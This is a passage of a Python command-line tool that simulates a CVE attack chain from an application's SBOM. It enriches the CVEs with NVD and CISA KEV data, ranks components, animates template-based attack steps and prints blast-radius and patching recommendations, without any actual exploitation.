    cve_ids: List[str], kev_lookup: Dict[str, Any]
) -> Dict[str, Dict[str, Any]]:
    """Enrich CVE list with data from NVD and KEV."""
    enriched: Dict[str, Dict[str, Any]] = {}

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Enriching CVEs from NVD...", total=len(cve_ids))

        for cve_id in cve_ids:
            progress.update(task, description=f"[cyan]Fetching {cve_id}...")

            # Start with local database info
            local_info = CVE_DATABASE.get(cve_id, {})
            enriched[cve_id] = {
                "cve_id": cve_id,
                "name": local_info.get("name", cve_id),
                "severity": local_info.get("severity", "UNKNOWN"),
                "cvss": local_info.get("cvss", 0.0),
                "attack_vector": local_info.get("attack_vector", "Unknown"),
                "is_kev": cve_id in kev_lookup,
                "kev_info": kev_lookup.get(cve_id),
                "action_template": local_info.get(
                    "action_template", "Exploit {component}"
                ),
                "impact_template": local_info.get(
                    "impact_template", "Compromised {component}"
                ),
                "kill_chain": local_info.get("kill_chain", "Exploitation"),
                "phase": local_info.get("phase", "Unknown"),
            }

            # Try to enrich from NVD (with rate limiting)
            nvd_info = fetch_nvd_cve(cve_id)
            if nvd_info:
                enriched[cve_id].update(
                    {
                        "description": nvd_info.get("description", ""),
                        "cvss": nvd_info.get("cvss_score", enriched[cve_id]["cvss"]),
                        "severity": nvd_info.get(
                            "severity", enriched[cve_id]["severity"]
                        ),
                        "attack_vector": nvd_info.get(
                            "attack_vector", enriched[cve_id]["attack_vector"]
                        ),
                        "attack_complexity": nvd_info.get(
                            "attack_complexity", "UNKNOWN"
                        ),
                        "privileges_required": nvd_info.get(
                            "privileges_required", "UNKNOWN"
                        ),
                    }
                )
                time.sleep(0.6)  # NVD rate limit: ~5 requests per 30 seconds

            progress.advance(task)

    return enriched


def generate_llm_attack_narrative(
    sbom: Dict[str, Any],
    enriched_cves: Dict[str, Dict[str, Any]],
    attack_steps: List[Dict[str, Any]],
) -> str:
    """Generate an LLM-based attack narrative (calls FixOps API if available)."""
    # Build context for LLM
    context = {
        "app_name": sbom.get("app_name", "Unknown App"),
        "components": [
            {
                "name": c.get("name"),
                "type": c.get("type"),
                "exposure": c.get("exposure"),
                "vulnerabilities": c.get("vulnerabilities", []),
            }
            for c in sbom.get("components", [])
        ],
        "cves": [
            {
                "cve_id": cve_id,
                "severity": info.get("severity"),
                "cvss": info.get("cvss"),
                "is_kev": info.get("is_kev"),
                "attack_vector": info.get("attack_vector"),
            }
            for cve_id, info in enriched_cves.items()
        ],
        "attack_chain": [
            {
                "phase": s.get("phase"),
                "cve": s.get("cve"),
                "component": s.get("component"),
                "action": s.get("action"),
            }
            for s in attack_steps
        ],
    }

    # Try to call FixOps API for LLM-generated narrative
    try:
        with get_client() as client:
            response = client.post(
                "/api/v1/enhanced/attack-narrative",
                json=context,
                timeout=30.0,
            )
            if response.status_code == 200:
                return response.json().get("narrative", "")
    except Exception:
        pass

    # Fallback: Generate a rule-based narrative
    kev_cves = [cve for cve, info in enriched_cves.items() if info.get("is_kev")]
    critical_cves = [
        cve for cve, info in enriched_cves.items() if info.get("cvss", 0) >= 9.0
    ]

    narrative = (
        f"Attack simulation against {sbom.get('app_name', 'target application')}:\n\n"
    )

    if kev_cves:
        narrative += f"[!] CRITICAL: {len(kev_cves)} CVE(s) are in CISA KEV (actively exploited in the wild): {', '.join(kev_cves)}\n\n"

    if critical_cves:
        narrative += f"[!] {len(critical_cves)} CRITICAL severity CVE(s) detected: {', '.join(critical_cves)}\n\n"

    narrative += "Attack progression:\n"
    for i, step in enumerate(attack_steps, 1):
        cve_info = enriched_cves.get(step.get("cve", ""), {})
        kev_tag = " [KEV]" if cve_info.get("is_kev") else ""
        narrative += f"  {i}. {step.get('phase')}: {step.get('action')}{kev_tag}\n"
        narrative += f"     Impact: {step.get('impact')}\n"

    return narrative


def generate_smart_attack_chain(
    sbom: Dict[str, Any],
    enriched_cves: Dict[str, Dict[str, Any]],
) -> List[Dict[str, Any]]:
    """Generate a smarter attack chain using EPSS, KEV, and CVSS scoring."""
    steps: List[Dict[str, Any]] = []
    comp_lookup = {c["id"]: c for c in sbom.get("components", [])}

    # Find vulnerable components
    vuln_components = [
        c for c in sbom.get("components", []) if c.get("vulnerabilities")
    ]

    if not vuln_components:
        return steps

    # Smart sorting: KEV first, then CVSS, then exposure
    def smart_sort_key(comp: Dict[str, Any]) -> Tuple[int, float, int]:
        exposure_order = {"internet": 0, "partner": 1, "internal": 2}
        exp_score = exposure_order.get(comp.get("exposure", "internal"), 2)

        # Check if any CVE is in KEV
        has_kev = any(
            enriched_cves.get(cve, {}).get("is_kev", False)
            for cve in comp.get("vulnerabilities", [])
        )

        # Get max CVSS for this component's vulns
        max_cvss = max(
            (
                enriched_cves.get(cve, {}).get("cvss", 0.0)
                for cve in comp.get("vulnerabilities", [])
            ),
            default=0.0,
        )

        # KEV first (0 if has KEV, 1 if not), then by CVSS (descending), then exposure
        return (0 if has_kev else 1, -max_cvss, exp_score)

    vuln_components.sort(key=smart_sort_key)

    # Build attack chain with smarter logic
    phases = [
        "Initial Access",
        "Lateral Movement",
        "Privilege Escalation",
        "Data Exfiltration",
    ]
    phase_idx = 0
    visited = set()
    current_comp = vuln_components[0] if vuln_components else None

    while current_comp and phase_idx < len(phases):
        comp_id = current_comp["id"]
        if comp_id in visited:
            break
        visited.add(comp_id)

        # Get the best CVE for this component (KEV first, then highest CVSS)
        comp_cves = current_comp.get("vulnerabilities", [])
        best_cve = None
        best_score = -1

        for cve_id in comp_cves:
            cve_info = enriched_cves.get(cve_id, {})
            # Score: KEV = 100, then CVSS
            score = 100 if cve_info.get("is_kev") else cve_info.get("cvss", 0)
            if score > best_score:
                best_score = score
                best_cve = cve_id

        cve_info = enriched_cves.get(best_cve, {}) if best_cve else {}

        # Determine next target
        next_target = None
        for dep_id in current_comp.get("dependencies", []):
            if dep_id in comp_lookup and dep_id not in visited:
                next_target = dep_id
                break

        if not next_target:
            for vc in vuln_components:
                if vc["id"] not in visited:
                    next_target = vc["id"]
                    break

        step = {
            "phase": phases[phase_idx],
            "cve": best_cve,
            "component": comp_id,
            "action": cve_info.get("action_template", "Exploit {component}").format(
                component=current_comp.get("name", comp_id)
            ),
            "impact": cve_info.get("impact_template", "Compromised {component}").format(
                component=current_comp.get("name", comp_id)
            ),
            "next_target": next_target,
            "kill_chain": cve_info.get("kill_chain", "Exploitation"),
            "is_kev": cve_info.get("is_kev", False),
            "cvss": cve_info.get("cvss", 0.0),
            "severity": cve_info.get("severity", "UNKNOWN"),
        }
        steps.append(step)
        phase_idx += 1

        if next_target and next_target in comp_lookup:
            current_comp = comp_lookup[next_target]
        else:
            break

    # Add final data exfiltration step if we have a database
    for comp in sbom.get("components", []):
        if comp.get("type") == "database" and comp["id"] not in visited:
            steps.append(
                {
                    "phase": "Data Exfiltration",
                    "cve": None,
                    "component": comp["id"],
                    "action": f"Access {comp.get('name', comp['id'])} using stolen credentials",
                    "impact": f"Data exfiltration from {comp.get('name', comp['id'])}",
                    "next_target": None,
                    "kill_chain": "Actions on Objectives",
                    "is_kev": False,
                    "cvss": 0.0,
                    "severity": "N/A",
                }
            )
            break

    return steps


def show_sbom_context(sbom: Dict[str, Any]):
    """Display SBOM context with component relationships."""
    console.print()

    # Component table
    table = Table(title=f"SBOM: {sbom['app_name']}", box=box.ROUNDED)
    table.add_column("Component", style="cyan")
    table.add_column("Type", style="white")
    table.add_column("Version", style="dim")
    table.add_column("Exposure", style="white")
    table.add_column("Vulnerabilities", style="red")

    for comp in sbom["components"]:
        exposure_color = {
            "internet": "red",
            "partner": "yellow",
            "internal": "green",
        }.get(comp.get("exposure", "internal"), "white")

        vuln_count = len(comp.get("vulnerabilities", []))
        vuln_display = (
            f"[red]{vuln_count}[/red]" if vuln_count > 0 else "[green]0[/green]"
        )

        table.add_row(
            comp["name"],
            comp["type"],
            comp["version"],
            f"[{exposure_color}]{comp.get('exposure', 'internal')}[/{exposure_color}]",
            vuln_display,
        )

    console.print(table)


def show_dependency_tree(sbom: Dict[str, Any]):
    """Display component dependency tree."""
    tree = Tree("[bold cyan]Application Architecture[/bold cyan]")

    # Build component lookup
    comp_lookup = {c["id"]: c for c in sbom["components"]}

    # Find root components (internet-facing)
    roots = [c for c in sbom["components"] if c.get("exposure") == "internet"]

    def add_component_branch(parent_tree: Tree, comp_id: str, visited: set):
        if comp_id in visited or comp_id not in comp_lookup:
            return
        visited.add(comp_id)

        comp = comp_lookup[comp_id]
        vulns = comp.get("vulnerabilities", [])
        vuln_indicator = f" [red]({len(vulns)} CVE)[/red]" if vulns else ""

        branch = parent_tree.add(
            f"[white]{comp['name']}[/white] ({comp['type']}){vuln_indicator}"
        )

        for dep_id in comp.get("dependencies", []):
            add_component_branch(branch, dep_id, visited)

    for root in roots:
        add_component_branch(tree, root["id"], set())

    console.print(tree)


def animate_attack_chain(steps: List[Dict[str, Any]]):
    """Animate the attack chain execution."""
    console.print()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        for i, step in enumerate(steps):
            # Phase header
            console.print()
            console.print(
                Panel(
                    f"[bold white]{step['phase']}[/bold white]\n"
                    f"Target: {step['component']}\n"
                    f"CVE: {step.get('cve', 'N/A')}",
                    title=f"[bold red]Attack Step {i+1}/{len(steps)}[/bold red]",
                    border_style="red",
                )
            )

            # Animate the attack step
            task = progress.add_task(f"[cyan]{step['action'][:50]}...", total=100)

            for j in range(100):
                time.sleep(0.03)
                progress.advance(task)

            # Show impact
            console.print(f"  [green]Action:[/green] {step['action']}")
            console.print(f"  [yellow]Impact:[/yellow] {step['impact']}")
            if step.get("next_target"):
                console.print(f"  [cyan]Next Target:[/cyan] {step['next_target']}")

            progress.remove_task(task)
            time.sleep(0.5)


def show_attack_path_tree(steps: List[Dict[str, Any]]):
    """Display the attack path as a tree."""
    tree = Tree("[bold red]Attack Path[/bold red]")

    current = tree
    for i, step in enumerate(steps):
        cve_info = f" via {step['cve']}" if step.get("cve") else ""
        node_text = (
            f"[bold]Step {i+1}:[/bold] {step['phase']}{cve_info}\n"
            f"  [dim]Target:[/dim] {step['component']}\n"
            f"  [dim]Impact:[/dim] {step['impact']}"
        )
        current = current.add(node_text)

    console.print(tree)


def show_blast_radius(sbom: Dict[str, Any], steps: List[Dict[str, Any]]):
    """Show the blast radius of the attack chain."""
    console.print()

    # Calculate affected components
    affected_components = set()
    for step in steps:
        affected_components.add(step["component"])

    # Find data at risk
    data_at_risk = []
    comp_lookup = {c["id"]: c for c in sbom["components"]}
    for comp_id in affected_components:
        comp = comp_lookup.get(comp_id, {})
        if comp.get("data_classification"):
            data_at_risk.append(f"{comp['name']} ({comp['data_classification']})")

    # Summary panel
    panel_content = (
        f"[bold]Compromised Components:[/bold] {len(affected_components)}\n"
        f"[bold]Attack Phases:[/bold] {len(steps)}\n"
        f"[bold]CVEs Exploited:[/bold] {sum(1 for s in steps if s.get('cve'))}\n"
        f"[bold]Data at Risk:[/bold] {', '.join(data_at_risk) if data_at_risk else 'None identified'}\n"
        f"[bold]Overall Risk:[/bold] [red]CRITICAL[/red]"
    )

    console.print(
        Panel(
            panel_content,
            title="[bold red]Blast Radius Assessment[/bold red]",
            border_style="red",
        )
    )


def show_attack_chain_summary(sbom: Dict[str, Any], steps: List[Dict[str, Any]]):
    """Display final attack chain summary."""
    console.print()

    # Timeline table
    table = Table(title="Attack Chain Timeline", box=box.DOUBLE)
    table.add_column("Step", style="cyan", width=6)
    table.add_column("Phase", style="white")
    table.add_column("CVE", style="red")
    table.add_column("Component", style="white")
    table.add_column("Kill Chain", style="yellow")

    for i, step in enumerate(steps):
        table.add_row(
            str(i + 1),
            step["phase"],
            step.get("cve", "-"),
            step["component"],
            step.get("kill_chain", "N/A"),
        )

    console.print(table)

    # Recommendations
    rec_tree = Tree("[bold green]Remediation Recommendations[/bold green]")
    rec_tree.add(
        "[white]1.[/white] Patch CVE-2021-44228 (Log4Shell) on web-gateway immediately"
    )
    rec_tree.add("[white]2.[/white] Update Spring Framework to fix CVE-2022-22965")
    rec_tree.add("[white]3.[/white] Implement network segmentation between services")
    rec_tree.add("[white]4.[/white] Enable database access logging and alerting")
    rec_tree.add("[white]5.[/white] Rotate all service credentials")
    rec_tree.add("[white]6.[/white] Conduct incident response tabletop exercise")

    console.print(rec_tree)


@app.command()
def attack_chain(
    app_name: str = typer.Option(
        "demo-ecommerce-app", "--app", "-a", help="Application name"
    ),
    sbom_path: Optional[str] = typer.Option(
        None, "--sbom", "-s", help="Path to SBOM file (CycloneDX or SPDX JSON)"
    ),
    cve_source: str = typer.Option(
        "demo", "--cve-source", "-c", help="CVE source: demo, live (NVD/KEV), or feeds"
    ),
    use_llm: bool = typer.Option(
        False, "--use-llm", "-l", help="Use LLM for smarter attack narratives"
    ),
    kev_only: bool = typer.Option(
        False, "--kev-only", "-k", help="Only include KEV-listed CVEs in attack chain"
    ),
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Verbose output"),
):
    """
    Simulate a combined attack chain exploiting multiple vulnerabilities.

    This command demonstrates how multiple CVEs can be chained together
    in the context of an application's SBOM to achieve maximum impact.

    Modes:
    - demo: Use built-in demo SBOM and CVE data (no network calls)
    - live: Fetch real CVE data from NVD and CISA KEV
    - feeds: Use FixOps API feeds (requires running API server)

    Examples:
        python micropentest_sidecar.py attack-chain --cve-source demo
        python micropentest_sidecar.py attack-chain --sbom my-app-sbom.json --cve-source live
        python micropentest_sidecar.py attack-chain --sbom my-app-sbom.json --cve-source live --use-llm
    """
    print_banner()

    # Determine mode label
    mode_label = cve_source.upper()
    if sbom_path:
        mode_label += " + CUSTOM SBOM"
    if use_llm:
        mode_label += " + LLM"

    console.print(
        Panel(
            f"[bold]Combined Attack Chain Simulation[/bold]\n\n"
            f"Application: {app_name}\n"
            f"Mode: {mode_label}\n"
            f"SBOM: {sbom_path or 'Demo SBOM'}\n"
            f"CVE Source: {cve_source}\n"
            f"LLM Enabled: {use_llm}\n\n"
            "[dim]This simulation shows how an attacker could chain multiple\n"
            "vulnerabilities together to compromise your application.[/dim]",
            title="[bold red]Attack Chain Simulator[/bold red]",
            border_style="red",
        )
    )

    # Phase 1: Load SBOM Context
    phase_header("1", "Loading SBOM & Application Context")

    if sbom_path:
        # Load custom SBOM file
        try:
            sbom_file = Path(sbom_path)
            console.print(f"[cyan]Loading SBOM from: {sbom_path}[/cyan]")
            sbom = load_sbom_file(sbom_file)
            sbom["app_name"] = app_name
            # Infer component exposure
            sbom = infer_component_exposure(sbom)
            console.print(
                f"[green]Loaded {len(sbom.get('components', []))} components[/green]"
            )
        except FileNotFoundError:
            console.print(f"[red]SBOM file not found: {sbom_path}[/red]")
            console.print("[yellow]Falling back to demo SBOM[/yellow]")
            sbom = DEMO_SBOM.copy()
        except Exception as exc:
            console.print(f"[red]Error loading SBOM: {exc}[/red]")
            console.print("[yellow]Falling back to demo SBOM[/yellow]")
            sbom = DEMO_SBOM.copy()
    else:
        console.print("[cyan]Using demo SBOM data[/cyan]")
        sbom = DEMO_SBOM.copy()

    time.sleep(0.5)
    show_sbom_context(sbom)

    # Phase 2: Enrich CVEs from external sources
    phase_header("2", "Enriching Vulnerability Data")

    # Collect all CVEs from SBOM
    all_cves: List[str] = []
    components: List[Dict[str, Any]] = sbom.get("components", [])
    for comp in components:
        vulns = comp.get("vulnerabilities", [])
        if isinstance(vulns, list):
            all_cves.extend(vulns)
    all_cves = list(set(all_cves))  # Deduplicate

    # If custom SBOM without vulns, try to look them up
    if not all_cves and sbom_path:
        console.print("[cyan]Looking up CVEs for SBOM components...[/cyan]")
        sbom = enrich_sbom_with_cves(sbom)
        enriched_components: List[Dict[str, Any]] = sbom.get("components", [])
        for comp in enriched_components:
            vulns = comp.get("vulnerabilities", [])
            if isinstance(vulns, list):
                all_cves.extend(vulns)
        all_cves = list(set(all_cves))

    if not all_cves:
        console.print("[yellow]No vulnerabilities found in SBOM[/yellow]")
        console.print(
            "[dim]Tip: Use --sbom with a CycloneDX/SPDX file that includes vulnerability data[/dim]"
        )
        return

    console.print(f"[cyan]Found {len(all_cves)} unique CVEs to analyze[/cyan]")

    # Fetch external CVE data based on source
    kev_lookup: Dict[str, Any] = {}
    enriched_cves: Dict[str, Dict[str, Any]] = {}

    if cve_source == "live":
        console.print(
            "[bold cyan]LIVE MODE: Fetching real CVE data from NVD and CISA KEV[/bold cyan]"
        )
        kev_lookup = fetch_kev_catalog()
        enriched_cves = enrich_cves_from_external(all_cves, kev_lookup)
    elif cve_source == "feeds":
        console.print("[bold cyan]FEEDS MODE: Using FixOps API feeds[/bold cyan]")
        if wait_for_api(timeout=10):
            # Try to fetch from FixOps API
            try:
                with get_client() as client:
                    for cve_id in all_cves:
                        resp = client.get(f"/api/v1/cve/{cve_id}")
                        if resp.status_code == 200:
                            enriched_cves[cve_id] = resp.json()
            except Exception:
                console.print(
                    "[yellow]Could not fetch from API - using local database[/yellow]"
                )
        if not enriched_cves:
            console.print("[yellow]Falling back to demo CVE data[/yellow]")
            for cve_id in all_cves:
                enriched_cves[cve_id] = CVE_DATABASE.get(cve_id, {"cve_id": cve_id})
    else:
        # Demo mode - use local database
        console.print("[bold cyan]DEMO MODE: Using local CVE database[/bold cyan]")
        for cve_id in all_cves:
            local_info = CVE_DATABASE.get(cve_id, {})
            enriched_cves[cve_id] = {
                "cve_id": cve_id,
                "name": local_info.get("name", cve_id),
                "severity": local_info.get("severity", "UNKNOWN"),
                "cvss": local_info.get("cvss", 0.0),
                "attack_vector": local_info.get("attack_vector", "Unknown"),
                "is_kev": False,
                "action_template": local_info.get(
                    "action_template", "Exploit {component}"
                ),
                "impact_template": local_info.get(
                    "impact_template", "Compromised {component}"
                ),
                "kill_chain": local_info.get("kill_chain", "Exploitation"),
                "phase": local_info.get("phase", "Unknown"),
            }

    # Show CVE enrichment summary
    kev_count = sum(1 for c in enriched_cves.values() if c.get("is_kev"))
    critical_count = sum(1 for c in enriched_cves.values() if c.get("cvss", 0) >= 9.0)

    if kev_count > 0:
        console.print(
            f"[bold red]WARNING: {kev_count} CVE(s) are in CISA KEV (actively exploited!)[/bold red]"
        )
    if critical_count > 0:
        console.print(f"[red]{critical_count} CRITICAL severity CVE(s) detected[/red]")

    # Filter to KEV-only if requested
    if kev_only:
        console.print("[yellow]Filtering to KEV-listed CVEs only[/yellow]")
        kev_filter_components: List[Dict[str, Any]] = sbom.get("components", [])
        for comp in kev_filter_components:
            existing_vulns = comp.get("vulnerabilities", [])
            if isinstance(existing_vulns, list):
                comp["vulnerabilities"] = [
                    cve
                    for cve in existing_vulns
                    if enriched_cves.get(cve, {}).get("is_kev", False)
                ]

    # Phase 3: Analyze Dependencies
    phase_header("3", "Analyzing Component Dependencies")
    with console.status("[bold cyan]Building dependency graph...", spinner="dots12"):
        time.sleep(1)
    show_dependency_tree(sbom)

    # Phase 4: Generate Smart Attack Chain
    phase_header("4", "Generating Attack Chain")
    console.print(
        "[cyan]Building optimal attack path based on KEV, CVSS, and exposure...[/cyan]"
    )

    # Generate attack chain using smart logic
    attack_steps = generate_smart_attack_chain(sbom, enriched_cves)

    if not attack_steps:
        console.print(
            "[yellow]Could not generate attack chain - no exploitable path found[/yellow]"
        )
        return

    # Show which CVEs will be chained
    vuln_table = Table(title="Vulnerabilities in Attack Chain", box=box.ROUNDED)
    vuln_table.add_column("Order", style="cyan")
    vuln_table.add_column("CVE", style="red")
    vuln_table.add_column("Component", style="white")
    vuln_table.add_column("CVSS", style="yellow")
    vuln_table.add_column("KEV", style="red")
    vuln_table.add_column("Phase", style="dim")

    for i, step in enumerate(attack_steps):
        kev_badge = (
            "[bold red]YES[/bold red]" if step.get("is_kev") else "[dim]No[/dim]"
        )
        cvss_str = f"{step.get('cvss', 0.0):.1f}" if step.get("cve") else "N/A"
        vuln_table.add_row(
            str(i + 1),
            step.get("cve") or "[dim]N/A[/dim]",
            step["component"],
            cvss_str,
            kev_badge,
            step["phase"],
        )

    console.print(vuln_table)

    # Phase 5: Execute Attack Chain Simulation
    phase_header("5", "Executing Attack Chain Simulation")
    console.print(
        "[bold yellow]WARNING: This is a simulation - no actual exploitation[/bold yellow]"
    )
    time.sleep(0.5)
    animate_attack_chain(attack_steps)

    # Phase 6: Show Attack Path
    phase_header("6", "Attack Path Visualization")
    show_attack_path_tree(attack_steps)

    # Phase 7: Blast Radius
    phase_header("7", "Blast Radius Assessment")
    show_blast_radius(sbom, attack_steps)

    # Phase 8: LLM-Generated Narrative (if enabled)
    if use_llm:
        phase_header("8", "LLM Attack Narrative")
        console.print("[cyan]Generating intelligent attack narrative...[/cyan]")
        narrative = generate_llm_attack_narrative(sbom, enriched_cves, attack_steps)
        if narrative:
            console.print(
                Panel(
                    narrative,
                    title="[bold]Attack Narrative[/bold]",
                    border_style="yellow",
                )
            )
        else:
            console.print(
                "[yellow]Could not generate LLM narrative - using rule-based summary[/yellow]"
            )

    # Phase 9: Summary & Recommendations
    phase_header("8" if not use_llm else "9", "Summary & Recommendations")
    show_attack_chain_summary(sbom, attack_steps)

    # Final summary
    console.print()
    summary_lines = [
        "[bold green]Attack Chain Simulation Complete![/bold green]\n",
        f"Application: {sbom.get('app_name', app_name)}",
        f"Components Analyzed: {len(sbom.get('components', []))}",
        f"CVEs in Chain: {len([s for s in attack_steps if s.get('cve')])}",
        f"KEV CVEs: {sum(1 for s in attack_steps if s.get('is_kev'))}",
        f"Attack Phases: {len(attack_steps)}",
        "",
        "[dim]Use this analysis to prioritize patching and implement",
        "defense-in-depth strategies.[/dim]",
    ]
    console.print(Panel("\n".join(summary_lines), border_style="green"))


if __name__ == "__main__":
    app()
